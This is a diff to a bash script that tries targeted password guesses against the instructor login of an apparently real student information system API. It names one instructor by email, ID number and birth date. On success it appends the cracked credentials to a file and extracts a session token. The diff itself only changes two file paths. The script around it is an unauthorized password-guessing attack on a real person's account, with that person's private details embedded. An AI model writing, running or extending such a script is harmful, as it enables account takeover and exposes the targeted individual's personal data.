@@ -1,7 +1,7 @@
 #!/bin/bash
 # Try instructor login with targeted passwords
 BASE="https://sis-api.emsi.ma"
-TOKEN_FILE="/home/ayoub/projects/cyper/.token.sh"
+TOKEN_FILE="./.token.sh"
 
 # Generate more targeted passwords for Safsouf
 # Known: y.safsouf@emsi.ma, SSN: EE56091, DOB: 1984-01-01
@@ -64,7 +64,7 @@ for pwd in "${PASSWORDS[@]}"; do
         echo "  ✅ SUCCESS! Password: \"$pwd\""
         echo "$result" > /tmp/instructor_login_success.json
         # Save to file
-        echo "y.safsouf@emsi.ma:$pwd" >> /home/ayoub/projects/cyper/cracked_passwords.txt
+        echo "y.safsouf@emsi.ma:$pwd" >> ./cracked_passwords.txt
         # Extract token
         cat /tmp/instructor_login_success.json | python3 -c "
 import json,sys
